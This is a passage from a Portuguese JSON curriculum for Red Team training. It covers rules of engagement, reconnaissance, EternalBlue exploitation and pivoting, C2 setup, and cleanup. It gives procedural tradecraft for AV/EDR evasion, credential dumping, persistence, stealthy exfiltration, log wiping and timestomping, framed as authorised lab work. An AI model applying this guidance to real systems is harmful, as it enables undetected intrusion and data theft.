                                    "Usar matriz de risco (probabilidade x impacto) para priorizar ameaças.",
                                    "Desenvolver planos de mitigação, como backups e kill switches.",
                                    "Realizar uma reunião de risco com a equipe para validar a avaliação."
                                  ],
                                  "verification": "Matriz de risco preenchida e planos de mitigação aprovados pela equipe.",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "Matriz de risco template (Excel)",
                                    "Checklists éticos de cibersegurança",
                                    "Ferramentas de análise de risco (ex: RiskWatch)"
                                  ],
                                  "tips": "Sempre priorize riscos éticos sobre operacionais para manter a integridade da simulação.",
                                  "learningObjective": "Desenvolver habilidades para identificar e mitigar riscos em simulações de Red Team.",
                                  "commonMistakes": [
                                    "Subestimar riscos éticos em cenários de ataque",
                                    "Não envolver a equipe na avaliação",
                                    "Ignorar regulamentações como GDPR ou leis locais"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Fiscalizar o Cumprimento das ROE Durante a Simulação",
                                  "subSteps": [
                                    "Monitorar ativamente a simulação via logs, dashboards e observação direta.",
                                    "Intervir imediatamente em caso de violação de ROE usando protocolos de parada.",
                                    "Registrar incidentes de risco em tempo real com timestamps e evidências.",
                                    "Comunicar atualizações de status para a equipe e observadores.",
                                    "Ajustar ROE dinamicamente se necessário, com aprovação prévia."
                                  ],
                                  "verification": "Logs de monitoramento mostram conformidade total ou intervenções documentadas.",
                                  "estimatedTime": "Tempo da simulação (ex: 8 horas)",
                                  "materials": [
                                    "Ferramentas de monitoramento (SIEM, Wireshark)",
                                    "Dashboards em tempo real (Splunk, ELK Stack)",
                                    "Protocolos de intervenção impressos"
                                  ],
                                  "tips": "Designe um observador dedicado para fiscalização imparcial.",
                                  "learningObjective": "Garantir adesão às ROE em tempo real para segurança e efetividade.",
                                  "commonMistakes": [
                                    "Falta de monitoramento proativo",
                                    "Intervenções tardias",
                                    "Não registrar evidências de conformidade"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Coordenar Debriefings Pós-Simulação",
                                  "subSteps": [
                                    "Coletar feedback quantitativo e qualitativo de todos os participantes.",
                                    "Revisar logs e incidentes para discutir violações de ROE ou riscos.",
                                    "Analisar lições aprendidas, focando em segurança e educação.",
                                    "Atualizar ROE e planos de risco baseados no debriefing.",
                                    "Documentar o relatório final e distribuí-lo aos stakeholders."
                                  ],
                                  "verification": "Relatório de debriefing completo distribuído e ações de follow-up agendadas.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Templates de debriefing",
                                    "Ferramentas de survey (Google Forms, SurveyMonkey)",
                                    "Relatórios de logs da simulação"
                                  ],
                                  "tips": "Estruture o debriefing com agenda fixa: fatos, análise, lições, ações.",
                                  "learningObjective": "Extrair valor educativo de simulações através de debriefings estruturados.",
                                  "commonMistakes": [
                                    "Debriefings superficiais sem análise de riscos",
                                    "Não documentar lições aprendidas",
                                    "Falta de follow-up em ações corretivas"
                                  ]
                                }
                              ],
                              "practicalExample": "Em uma simulação de ataque cibernético a uma rede bancária simulada, o Líder do Red Team define ROE proibindo acesso a dados reais de clientes, avalia riscos éticos de phishing simulado, monitora via Wireshark durante o exercício e coordena um debriefing onde a equipe discute uma violação acidental de ROE, resultando em treinamento adicional.",
                              "finalVerifications": [
                                "ROE definidas e aprovadas antes da simulação.",
                                "Matriz de riscos completa com mitigações implementadas.",
                                "Logs de fiscalização mostram 100% de conformidade ou intervenções bem-sucedidas.",
                                "Debriefing realizado com relatório distribuído.",
                                "Feedback da equipe indica simulação segura e educativa.",
                                "Atualizações em ROE baseadas em lições aprendidas."
                              ],
                              "assessmentCriteria": [
                                "Clareza e completude das ROE (nota 1-10).",
                                "Profundidade da avaliação de riscos (cobertura operacional e ética).",
                                "Efetividade da fiscalização (número de intervenções necessárias).",
                                "Qualidade do debriefing (lições acionáveis extraídas).",
                                "Conformidade geral com guias como Vest e Tuberville.",
                                "Feedback quantitativo da equipe (média > 4/5)."
                              ],
                              "crossCurricularConnections": [
                                "Ética e Direito: Análise de conformidade legal em simulações.",
                                "Gerenciamento de Projetos: Planejamento e mitigação de riscos.",
                                "Psicologia Organizacional: Mindset de equipe em debriefings.",
                                "Engenharia de Software: Monitoramento e logging de sistemas.",
                                "Liderança: Coordenação de equipes multidisciplinares."
                              ],
                              "realWorldApplication": "Em operações de Red Team corporativas ou militares, como pentests em bancos ou exercícios de defesa cibernética do governo, garantindo que ataques simulados não causem danos reais, violações legais ou éticas, maximizando o aprendizado sem comprometer a segurança."
                            },
                            "estimatedTime": "2 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "2.0.2.3.2",
                        "name": "Operador do Red Team",
                        "description": "Os operadores são os executores técnicos das operações, responsáveis pela realização de ataques simulados, desde reconnaissance até persistência e comando & controle, utilizando ferramentas de ethical hacking.",
                        "specificSkills": [
                          {
                            "id": "2.0.2.3.2.1",
                            "name": "Execução de Reconhecimento e Enumeração",
                            "description": "Realizar varreduras iniciais e enumeração de alvos para mapear infraestrutura, serviços e vulnerabilidades, empregando ferramentas como Nmap e adaptando táticas ao mindset do adversário.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Definição de Objetivos e Regras de Engajamento (ROE)",
                                  "subSteps": [
                                    "Analise o escopo do engajamento e identifique alvos autorizados via documentação do cliente.",
                                    "Defina objetivos específicos de recon, como mapear hosts, serviços e versões.",
                                    "Estabeleça ROE claras, incluindo limites de IP, horários permitidos e métricas de stealth.",
                                    "Avalie o mindset do adversário: identifique defesas esperadas como IDS/IPS e adapte táticas.",
                                    "Crie um plano inicial de recon com fases passiva e ativa."
                                  ],
                                  "verification": "Checklist de ROE assinada e plano de recon documentado com aprovação.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Documentação do cliente/escopo",
                                    "Template de ROE",
                                    "Ferramentas de planejamento como CherryTree ou OneNote"
                                  ],
                                  "tips": [
                                    "Priorize OPSEC desde o início; use VPN/Tor para planejamento.",
                                    "Considere cenários de detecção precoce."
                                  ],
                                  "learningObjective": "Compreender e documentar o escopo e regras para recon seguro e eficaz.",
                                  "commonMistakes": [
                                    "Ignorar ROE levando a violações legais.",
                                    "Subestimar defesas do adversário.",
                                    "Falta de documentação clara."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Reconhecimento Passivo de Informações",
                                  "subSteps": [
                                    "Colete dados públicos via WHOIS, DNS enumeration (dig, dnsdumpster.com) e Shodan/Google dorks.",
                                    "Mapeie domínios relacionados, subdomínios e endereços IP associados ao alvo.",
                                    "Pesquise por leaks em sites como HaveIBeenPwned, GitHub e Pastebin.",
                                    "Analise perfis sociais e job postings para inferir tecnologias usadas.",
                                    "Documente todos os achados em um relatório inicial sem interação direta com o alvo."
                                  ],
                                  "verification": "Relatório passivo com pelo menos 10 itens de intel coletados e fontes citadas.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Navegador com extensões (Shodan, VirusTotal)",
                                    "Ferramentas: dig, theHarvester, dnsrecon",
                                    "Recon-ng framework"
                                  ],
                                  "tips": [
                                    "Use proxies rotativos para anonimato.",
                                    "Evite queries excessivas que possam ser logadas."
                                  ],
                                  "learningObjective": "Coletar inteligência passiva sem alertar defesas do alvo.",
                                  "commonMistakes": [
                                    "Queries diretas demais que revelam interesse.",
                                    "Não validar fontes de dados.",
                                    "Sobrecarga de dados sem priorização."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Varredura Ativa Inicial com Nmap",
                                  "subSteps": [
                                    "Execute ping scan (-sn) para host discovery em ranges de IP identificados.",
                                    "Realize SYN scan stealthy (-sS -T2) para mapear hosts ativos e portas abertas.",
                                    "Adicione service version detection (-sV) e OS fingerprinting (-O) em scans selecionados.",
                                    "Use scripts NSE seletivos (nmap --script vuln) para detecção inicial de vulns.",
                                    "Adapte timing e decoys (-D) baseado no mindset adversário para evasão de IDS."
                                  ],
                                  "verification": "Output do Nmap salvo com topologia de hosts/portas mapeada e sem alertas de detecção.",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "Nmap instalado",
                                    "Kali Linux ou equivalente",
                                    "Target lab (ex: Metasploitable)",
                                    "Masscan para scans rápidos opcionais"
                                  ],
                                  "tips": [
                                    "Teste em lab primeiro; ajuste --max-rate para stealth.",
                                    "Combine com firewall evasion techniques."
                                  ],
                                  "learningObjective": "Executar varreduras ativas seguras para mapear infraestrutura sem detecção.",
                                  "commonMistakes": [
                                    "Scans agressivos (-T4/5) que acionam alertas.",
                                    "Não fragmentar pacotes em redes filtradas.",
                                    "Ignorar rate limiting."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Enumeração Detalhada e Análise",
                                  "subSteps": [
                                    "Enumere serviços específicos: SMB (enum4linux), HTTP (gobuster/dirb), SNMP (onesixtyone).",
                                    "Identifique usuários via /etc/passwd enumeration ou SNMP walks.",
                                    "Busque vulns conhecidas com ferramentas como OpenVAS ou scripts NSE avançados.",
                                    "Analise resultados contra mindset adversário: priorize paths de ataque prováveis.",
                                    "Compile relatório final com visualizações (ex: Maltego ou draw.io)."
                                  ],
                                  "verification": "Relatório de enumeração com lista de serviços/vulns priorizadas e recomendações.",
                                  "estimatedTime": "4 horas",
                                  "materials": [
                                    "Ferramentas: gobuster, nikto, enum4linux, snmpwalk",
                                    "Lab targets com serviços variados"
                                  ],
                                  "tips": [
                                    "Automatize com scripts bash/python para eficiência.",
                                    "Correlacione dados passivos com ativos."
                                  ],
                                  "learningObjective": "Realizar enumeração profunda e analisar para planejamento de ataques.",
                                  "commonMistakes": [
                                    "Enumeração ruidosa pós-scan inicial.",
                                    "Não priorizar achados acionáveis.",
                                    "Falta de correlação entre dados."
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Documentação, Revisão e Adaptação",
                                  "subSteps": [
                                    "Revise todos os dados coletados e valide com cross-checks (ex: múltiplas ferramentas).",
                                    "Adapte táticas baseado em respostas observadas (ex: se IDS detectou, mude para passivo).",
                                    "Documente chain of custody e evidências em formato timestamped.",
                                    "Prepare handover para próximas fases do Red Team.",
                                    "Realize debrief: lições aprendidas e melhorias OPSEC."
                                  ],
                                  "verification": "Relatório final aprovado com mindmap da infra e plano de ataque preliminar.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Ferramentas de reporting: Dradis, Faraday",
                                    "Templates de relatório Red Team"
                                  ],
                                  "tips": [
                                    "Use version control para docs (Git).",
                                    "Sempre assuma logging adversário."
                                  ],
                                  "learningObjective": "Documentar recon de forma profissional e iterar baseado em feedback.",
                                  "commonMistakes": [
                                    "Documentação incompleta.",
                                    "Não adaptar a detecções.",
                                    "Vazamento de dados sensíveis."
                                  ]
                                }
                              ],
                              "practicalExample": "Em um lab CTF com alvo 'targetcorp.com', faça recon passivo revelando subdomínios via dnsdumpster, scan Nmap SYN em 192.168.1.0/24 descobrindo host 192.168.1.10:80/445, enumere SMB shares com enum4linux encontrando share 'confidencial' com usuários admin/guest, identificando CVE-2017-0144 (EternalBlue) para exploração posterior.",
                              "finalVerifications": [
                                "Mapa completo de hosts, portas e serviços do alvo.",
                                "Lista priorizada de 5+ vulnerabilidades potenciais com CVEs.",
                                "Evidência de stealth: nenhum alerta simulado de IDS durante scans.",
                                "Relatório documentado com fontes e timestamps.",
                                "Plano adaptado ao mindset adversário (ex: evasão de SIEM).",
                                "Validação cross-tool dos achados principais."
                              ],
                              "assessmentCriteria": [
                                "Precisão e completude do mapeamento (90%+ cobertura).",
                                "Nível de stealth mantido (sem detecções em logs simulados).",
                                "Eficiência temporal vs. qualidade dos dados.",
                                "Adaptação correta ao contexto adversário.",
                                "Qualidade da documentação e análise.",
                                "Identificação de pelo menos 3 paths de ataque viáveis."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Entendimento profundo de TCP/IP, portas e protocolos.",
                                "Programação: Scripting Nmap NSE e automação com Python/Bash.",
                                "Ética e Direito: Conformidade com ROE e leis de cibersegurança.",
                                "Análise de Dados: Correlação e visualização de intel (ex: ELK stack).",
                                "Psicologia: Modelagem de mindset adversário para táticas adaptativas."
                              ],
                              "realWorldApplication": "Em operações Red Team profissionais, como engajamentos de pentest para Fortune 500, o recon e enumeração inicial permite mapear redes enterprise sem detecção, identificando weak points como RDP exposto ou misconfigs AWS, guiando exploits direcionados e melhorando defesas via relatório final."
                            },
                            "estimatedTime": "3 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "2.0.2.3.2.2",
                            "name": "Exploração de Vulnerabilidades e Pivoting",
                            "description": "Explorar vulnerabilidades identificadas com exploits personalizados, realizar pivoting entre sistemas comprometidos e estabelecer persistência, conforme técnicas descritas em Simpson et al.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Preparar Exploits Personalizados para Vulnerabilidades Identificadas",
                                  "subSteps": [
                                    "Analise relatórios de varredura (ex: Nmap, Nessus) para priorizar vulnerabilidades com alto impacto (CVSS > 7.0).",
                                    "Pesquise exploits existentes no Exploit-DB ou Metasploit para a vulnerabilidade específica (ex: CVE-2017-0144 EternalBlue).",
                                    "Customizar o exploit: ajuste payloads para bypass de AV/EDR, adapte para arquitetura alvo (x86/x64) e integre com framework como Metasploit.",
                                    "Teste o exploit em ambiente isolado (ex: VM local) para validar eficácia e coletar métricas de sucesso.",
                                    "Documente configurações do exploit, incluindo opções de payload e handlers."
                                  ],
                                  "verification": "Exploit customizado executa com sucesso em VM de teste, obtendo shell reversa estável.",
                                  "estimatedTime": "2-3 hours",
                                  "materials": [
                                    "Ferramentas: Metasploit, Searchsploit, Python/Ruby para customização",
                                    "Ambiente: VMs vulneráveis (Metasploitable, VulnHub)",
                                    "Documentação: Relatórios de scan"
                                  ],
                                  "tips": "Use msfvenom para gerar payloads personalizados e sempre inclua encoders para evasão.",
                                  "learningObjective": "Dominar customização de exploits para cenários reais de Red Team.",
                                  "commonMistakes": [
                                    "Não testar em ambiente idêntico ao alvo",
                                    "Ignorar detecção por EDR",
                                    "Payloads incompatíveis com SO alvo"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Executar Exploração e Ganho de Acesso Inicial",
                                  "subSteps": [
                                    "Posicione-se na rede alvo via foothold inicial (ex: phishing ou VPN pivot).",
                                    "Execute o exploit contra o host vulnerável, monitorando tráfego com Wireshark.",
                                    "Estabeleça sessão shell interativa (Meterpreter preferencial) e eleve privilégios se necessário (ex: local exploits).",
                                    "Enumere o sistema comprometido: users, processes, network interfaces.",
                                    "Colete credenciais e hashes para uso posterior (ex: mimikatz ou secretsdump)."
                                  ],
                                  "verification": "Shell estável obtida no host alvo com privilégios de sistema e enumeração básica completa.",
                                  "estimatedTime": "1-2 hours",
                                  "materials": [
                                    "Metasploit console",
                                    "Wireshark",
                                    "Post-exploitation modules (hashdump, getsystem)"
                                  ],
                                  "tips": "Monitore logs do target para detecção precoce e use sessões multi-handler para redundância.",
                                  "learningObjective": "Executar exploração ética com minimização de ruído e footprint.",
                                  "commonMistakes": [
                                    "Execução ruidosa sem OPSEC",
                                    "Falha em elevar privilégios",
                                    "Não mascarar tráfego de C2"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Realizar Pivoting entre Sistemas Comprometidos",
                                  "subSteps": [
                                    "Identifique hosts internos acessíveis via netstat, arp-scan ou roteamento no host pivot.",
                                    "Configure pivoting no Metasploit: use route add ou socks proxy para tunelar tráfego.",
                                    "Varra sub-redes internas (ex: autoroute + portfwd) e identifique novos alvos.",
                                    "Exploite hosts secundários através do pivot, repetindo processo de exploração.",
                                    "Valide conectividade end-to-end com traceroute ou ping tunelado."
                                  ],
                                  "verification": "Acesso shell obtido em pelo menos 2 hosts adicionais via pivot, com tráfego roteado corretamente.",
                                  "estimatedTime": "2-4 hours",
                                  "materials": [
                                    "Metasploit (autoroute, socks4a)",
                                    "Chisel ou SSH para SOCKS proxy alternativo",
                                    "Lab multi-máquina"
                                  ],
                                  "tips": "Prefira pivoting SOCKS para flexibilidade e combine com tunelamento SSH para OPSEC.",
                                  "learningObjective": "Expandir foothold lateralmente em redes segmentadas.",
                                  "commonMistakes": [
                                    "Pivots mal configurados causando loops",
                                    "Exposição de tráfego pivot a detecção",
                                    "Ignorar firewalls internos"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Estabelecer Persistência nos Sistemas Comprometidos",
                                  "subSteps": [
                                    "Escolha técnica de persistência baseada no SO (ex: scheduled tasks no Windows, cron no Linux).",
                                    "Crie backdoor customizado (ex: Meterpreter service, PowerShell empire agent).",
                                    "Configure C2 resiliente com domínios múltiplos e rotacionamento de IPs.",
                                    "Teste persistência: reinicie hosts e verifique reconexão automática.",
                                    "Limpe traces: remova logs, artifacts e normalize configurações."
                                  ],
                                  "verification": "Persistência sobrevive a reboot em todos hosts pivotados, com C2 reconectando em <5min.",
                                  "estimatedTime": "1-2 hours",
                                  "materials": [
                                    "Persistence modules Metasploit/Empire/Covenant",
                                    "Scripts custom (persistence.py)"
                                  ],
                                  "tips": "Use técnicas low-and-slow para persistência stealth e integre com living-off-the-land binaries.",
                                  "learningObjective": "Manter acesso de longo prazo conforme táticas MITRE ATT&CK (TA0003).",
                                  "commonMistakes": [
                                    "Persistência detectável por EDR",
                                    "Sem teste de resiliência",
                                    "Falha em cleanup"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um lab com 3 VMs (Windows Server vulnerável a EternalBlue, Linux internal server, Domain Controller): customize EternalBlue para shell no Windows, pivote via SOCKS para Linux (exploite DirtyCow), estabeleça persistência em ambos com Meterpreter service e scheduled task, simulando APT lateral movement.",
                              "finalVerifications": [
                                "Exploit custom executado com sucesso em pelo menos 2 hosts sem detecção inicial.",
                                "Pivoting permite acesso a sub-rede interna com baixa latência.",
                                "Persistência mantém C2 após múltiplos reboots e kill processes.",
                                "Documentação completa de chain de ataque (TTPs MITRE).",
                                "Cleanup remove todos artifacts visíveis.",
                                "Relatório inclui screenshots de shells e network graphs."
                              ],
                              "assessmentCriteria": [
                                "Precisão e stealth na customização de exploits (sem crashes ou AV hits).",
                                "Eficiência no pivoting (tempo <10min por hop, zero exposição externa).",
                                "Robustez da persistência (99% uptime pós-reboot).",
                                "Adesão a OPSEC (logs limpos, tráfego mimetizado).",
                                "Qualidade da documentação e análise de riscos.",
                                "Criatividade em adaptações para variações de SO."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Compreensão de routing, firewalls e tunneling (SC-03).",
                                "Programação: Scripting de exploits em Python/Ruby (PROG-04).",
                                "Sistemas Operacionais: Técnicas de persistência e enumeração (SO-02).",
                                "Ética e Direito: Regras de engajamento em Red Team (ETH-01).",
                                "Análise de Malware: Reverse engineering de payloads (MAL-03)."
                              ],
                              "realWorldApplication": "Em operações de Red Team profissionais, como jogos de guerra cibernética, permite simular ataques APT avançados (ex: SolarWinds-style), testando defesas laterais de empresas, conforme frameworks como MITRE ATT&CK e técnicas de Simpson et al. em ambientes autorizados."
                            },
                            "estimatedTime": "5 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "2.0.2.3.2.3",
                            "name": "Manutenção de Comando e Controle",
                            "description": "Implementar canais de C2 (Comando e Controle) para gerenciar implantes e exfiltrar dados simulados, garantindo stealth e resiliência contra detecção pela Blue Team.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Selecionar e Configurar Infraestrutura C2 Básica",
                                  "subSteps": [
                                    "Escolher um framework C2 open-source como Covenant ou Sliver adequado para simulações educacionais.",
                                    "Instalar o framework em uma VM isolada (ex: Kali Linux) seguindo documentação oficial.",
                                    "Configurar listeners iniciais com protocolos stealth como HTTP/S ou DNS.",
                                    "Definir certificados SSL autoassinados ou Let's Encrypt para tráfego criptografado.",
                                    "Testar listener localmente com curl ou ferramenta similar."
                                  ],
                                  "verification": "Listener responde a requisições de teste sem erros de log e tráfego é criptografado (verificar com Wireshark).",
                                  "estimatedTime": "1-2 horas",
                                  "materials": [
                                    "VM Kali Linux",
                                    "Git para clonar repositório Covenant/Sliver",
                                    "Docker (opcional)",
                                    "Ferramentas de monitoramento como Wireshark"
                                  ],
                                  "tips": "Inicie com configurações padrão e customize apenas o necessário para evitar erros iniciais.",
                                  "learningObjective": "Compreender os componentes fundamentais de um servidor C2 e configurá-lo de forma segura em ambiente controlado.",
                                  "commonMistakes": [
                                    "Expor portas padrão sem ofuscação.",
                                    "Ignorar configuração de firewall na VM C2.",
                                    "Usar certificados inválidos que triggeram alertas."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Gerar e Implantar Payloads em Targets Simulados",
                                  "subSteps": [
                                    "Gerar payloads compatíveis com o target (ex: Windows .NET para Covenant).",
                                    "Ofuscar payload com ferramentas como Invoke-Obfuscation para evadir AV básicas.",
                                    "Entregar payload via vetor simulado (ex: SMB share, phishing com HTA).",
                                    "Executar payload no target VM e confirmar beacon inicial.",
                                    "Configurar check-ins periódicos com jitter para evitar padrões detectáveis."
                                  ],
                                  "verification": "Beacon aparece no painel C2 com metadados do implante (IP, user, etc.) e responde a ping.",
                                  "estimatedTime": "1-1.5 horas",
                                  "materials": [
                                    "VM target Windows 10/11",
                                    "Payload generator do framework C2",
                                    "Metasploit ou Cobalt Strike trial para comparação (opcional)"
                                  ],
                                  "tips": "Use jitter de 30-60% no check-in para simular tráfego humano.",
                                  "learningObjective": "Dominar geração e implantação inicial de implantes com foco em evasão básica.",
                                  "commonMistakes": [
                                    "Payload não ofuscado detectado por Windows Defender.",
                                    "IPs hardcoded no payload.",
                                    "Falta de sleeper/check-in config."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Estabelecer Comunicação Segura e Gerenciar Implantes",
                                  "subSteps": [
                                    "Executar comandos básicos no implante (ex: whoami, netstat, screenshot).",
                                    "Configurar túneis ou proxies para roteamento de tráfego (ex: SOCKS via C2).",
                                    "Implementar killswitch ou self-destruct para cenários de compromisso.",
                                    "Gerenciar múltiplos implantes com perfis separados no painel C2.",
                                    "Monitorar logs de comunicação para anomalias."
                                  ],
                                  "verification": "Todos comandos executam sem falhas e output retorna ao C2 em <10s.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Painel web do C2 framework",
                                    "Documentação de comandos do framework"
                                  ],
                                  "tips": "Registre sessões com screen/tmux para auditoria posterior.",
                                  "learningObjective": "Gerenciar implantes ativamente garantindo controle remoto confiável.",
                                  "commonMistakes": [
                                    "Comandos ruidosos como 'whoami' em produção.",
                                    "Falta de autenticação mútua.",
                                    "Sobrecarga de beacons simultâneos."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Configurar Exfiltração de Dados com Stealth",
                                  "subSteps": [
                                    "Identificar dados simulados no target (ex: logs, credenciais em arquivos).",
                                    "Configurar tasks de exfil no C2 (ex: upload via HTTPS com chunking).",
                                    "Implementar staging: compactar e criptografar dados antes de envio.",
                                    "Usar domínios legítimos ou CDNs para mascarar tráfego (ex: AWS S3 simulado).",
                                    "Verificar integridade dos dados exfiltrados com hashes."
                                  ],
                                  "verification": "Dados chegam ao C2 intactos, sem perda, e tamanho < threshold de detecção (ex: <1MB por burst).",
                                  "estimatedTime": "1-1.5 horas",
                                  "materials": [
                                    "Arquivos simulados no target",
                                    "Ferramentas de hash como sha256sum"
                                  ],
                                  "tips": "Exfiltre em horários off-peak e misture com tráfego legítimo.",
                                  "learningObjective": "Exfiltrar dados de forma furtiva minimizando footprints.",
                                  "commonMistakes": [
                                    "Exfiltração em burst grande.",
                                    "Sem criptografia em trânsito.",
                                    "Nomes de arquivos descritivos nos payloads."
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Testar Resiliência e Stealth contra Detecção Simulada",
                                  "subSteps": [
                                    "Simular Blue Team: rodar scans com Nmap, Sigma rules ou EDR simulado.",
                                    "Testar pivoting e fallback channels (ex: DNS se HTTP falhar).",
                                    "Analisar tráfego com Wireshark/Zeek para beacons detectáveis.",
                                    "Implementar atualizações OOB (out-of-band) para patches de implantes.",
                                    "Documentar MITRE ATT&CK mappings (T1071, T1571)."
                                  ],
                                  "verification": "C2 persiste >80% do tempo sob pressão simulada; zero alertas em tools básicas.",
                                  "estimatedTime": "1.5-2 horas",
                                  "materials": [
                                    "Ferramentas Blue Team: Snort, OSSEC, Elastic Stack simulado",
                                    "MITRE ATT&CK Navigator"
                                  ],
                                  "tips": "Registre todos testes em relatório para iterações.",
                                  "learningObjective": "Validar resiliência do C2 contra táticas defensivas comuns.",
                                  "commonMistakes": [
                                    "Ignorar jitter/DNS fallback.",
                                    "Logs verbosos no C2.",
                                    "Testes sem isolamento de rede."
                                  ]
                                }
                              ],
                              "practicalExample": "Em um lab com 3 VMs (Kali C2, Windows Target, Ubuntu Blue Team): Instale Covenant no Kali, gere payload ofuscado, implante via SMB no Windows, execute comandos para dump LSASS simulado, exfiltre via HTTPS para S3 bucket fake, teste com Snort rules no Ubuntu simulando detecção - C2 sobrevive com 90% uptime.",
                              "finalVerifications": [
                                "Implantes conectam e respondem consistentemente por 24h simuladas.",
                                "Exfiltração de 10MB de dados sem perda ou alertas.",
                                "Fallback channels ativam sob bloqueio de porta.",
                                "Tráfego passa como benigno em análise básica (Wireshark).",
                                "Killswitch executa remotamente sem vestígios.",
                                "Relatório MITRE ATT&CK completo mapeado."
                              ],
                              "assessmentCriteria": [
                                "Stealth score: <5% detecção em EDR simulado.",
                                "Resiliência: uptime >85% sob ataques Blue Team.",
                                "Eficiência: comandos <5s latência média.",
                                "Segurança: zero credenciais plaintext em trânsito.",
                                "Documentação: passos reproduzíveis em 80% de tentativas.",
                                "Escalabilidade: gerencia 5+ implantes simultâneos."
                              ],
                              "crossCurricularConnections": [
                                "Redes: Protocolos HTTP/DNS tunneling (SC-03 Networking).",
                                "Criptografia: TLS/SSL e ofuscação (SC-04 Cryptography).",
                                "Programação: Scripting payloads em PowerShell/C# (SC-02 Programming).",
                                "Sistemas Operacionais: Interações kernel/user-mode (SC-01 OS Fundamentals).",
                                "Inteligência de Ameaças: Mapeamento ATT&CK (SC-07 Threat Intel)."
                              ],
                              "realWorldApplication": "Em Red Team engagements e CTFs, mantém acesso persistente durante wargames cibernéticos; APTs como APT29 usam C2 resilientes para gerenciar botnets globais, exfiltrando IP/credenciais sem detecção por semanas."
                            },
                            "estimatedTime": "4 horas",
                            "difficulty": "advanced",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "2.0.2.3.2.4",
                            "name": "Limpeza e Saída Tática",
                            "description": "Executar ações de cleanup para remover vestígios de comprometimento e simular uma saída limpa, minimizando indicadores de compromisso (IOCs).",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Identificar e Catalogar Todos os Vestígios e IOCs",
                                  "subSteps": [
                                    "Revisar todos os acessos realizados durante a operação (RDP, SSH, web shells).",
                                    "Listar arquivos criados, modificados ou acessados, incluindo temporários e caches.",
                                    "Identificar entradas em logs de sistema, rede e aplicação (event logs, firewall logs).",
                                    "Mapear mecanismos de persistência instalados (backdoors, scheduled tasks).",
                                    "Documentar conexões de rede e tráfego gerado (IPs, portas, payloads)."
                                  ],
                                  "verification": "Criação de uma lista exaustiva de IOCs em formato tabular ou checklist, revisada por pares.",
                                  "estimatedTime": "1-2 horas",
                                  "materials": [
                                    "Ferramentas de log analysis (Event Viewer, Splunk, ELK Stack)",
                                    "Scripts personalizados para enumeração de artifacts",
                                    "Documentação da operação inicial"
                                  ],
                                  "tips": [
                                    "Use scripts automatizados para acelerar a enumeração.",
                                    "Priorize IOCs de alta visibilidade como logs de autenticação.",
                                    "Faça backup da lista antes de prosseguir."
                                  ],
                                  "learningObjective": "Capacitar o aprendiz a mapear sistematicamente todos os traços de comprometimento deixados na operação.",
                                  "commonMistakes": [
                                    "Subestimar logs de rede ou proxies.",
                                    "Ignorar artifacts em memória (processos rodando).",
                                    "Esquecer de vestígios em hosts pivô."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Planejar a Sequência de Limpeza e Saída",
                                  "subSteps": [
                                    "Definir ordem reversa de ações: remover persistência primeiro, depois logs, por último conexões ativas.",
                                    "Avaliar impactos potenciais da limpeza (ex: detecção por SIEM).",
                                    "Preparar scripts ou comandos para limpeza automatizada.",
                                    "Planejar rotas de saída limpa (kill chains reversos).",
                                    "Simular cenários de falha e planos de contingência."
                                  ],
                                  "verification": "Plano de limpeza documentado com sequência priorizada e scripts testados em ambiente controlado.",
                                  "estimatedTime": "45 minutos - 1 hora",
                                  "materials": [
                                    "Editor de scripts (PowerShell ISE, VS Code)",
                                    "Ambiente de teste isolado (VMs)",
                                    "Templates de planos de saída tática"
                                  ],
                                  "tips": [
                                    "Sempre teste scripts em lab antes de produção.",
                                    "Inclua timestamps para alinhar com logs.",
                                    "Considere stealth: evite picos de atividade."
                                  ],
                                  "learningObjective": "Desenvolver habilidades para criar planos táticos que minimizem detecção durante a limpeza.",
                                  "commonMistakes": [
                                    "Ordem errada causando detecção imediata.",
                                    "Falta de testes em scripts.",
                                    "Ignorar dependências entre artifacts."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Executar a Limpeza de Vestígios",
                                  "subSteps": [
                                    "Remover persistência (tarefas agendadas, registry keys, services).",
                                    "Limpar logs e eventos (clear-eventlog, wevtutil, rotacionar logs).",
                                    "Deletar ou ofuscar arquivos e diretórios criados.",
                                    "Encerrar sessões ativas e limpar caches de rede (ARP, DNS).",
                                    "Executar anti-forense básica (timestomping, slack space cleaning)."
                                  ],
